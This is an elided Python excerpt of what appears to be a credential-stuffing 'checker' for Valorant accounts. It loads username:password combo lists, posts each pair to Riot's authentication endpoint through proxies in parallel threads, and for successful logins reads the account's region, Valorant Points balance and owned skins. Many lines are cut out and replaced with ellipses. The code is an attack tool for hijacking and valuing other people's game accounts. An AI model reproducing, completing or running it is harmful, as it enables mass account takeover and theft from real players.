...
def load_combos():
    ...
    fileNameCombo = filedialog.askopenfile(
        parent=root,
        mode="rb",
...
def checker(username, password):
    ...
    r = session.post(
        f"https://auth.riotgames.com/api/v1/authorization",
        json=data,
        headers=headers,
        proxies={"http": proxy},
        timeout=5,
    ...
    GetAccountRegion = sess.get(
        f"https://api.henrikdev.xyz/valorant/v1/account/{GameName}/{Tag}",
        headers=DefaultHeaders1,
    )
    ...
    try:
        GetPoints = sess.get(
            f"https://pd.{Region}.a.pvp.net/store/v1/wallet/{Sub}",
            headers=PvpNetHeaders,
        )
        ValorantPoints = GetPoints.json()["Balances"][
    ...
    r = sess.get(
        f"https://pd.{Region}.a.pvp.net/store/v1/entitlements/{puuid}/e7c63390-eda7-46e0-bb7a-a6abdacd2433",
        headers=heders,
    )
    response_API = requests.get(
        "https://raw.githubusercontent.com/CSTCryst/Skin-Api/main/SkinList"
    )
        ...
        try:
            for _ in range(int(threads)):
                for i in range(len(usernames)):
                    t = threading.Thread(
                        target=checker, args=(usernames[i], passwords[i])
                    )
                    t.start()
                    t.join()
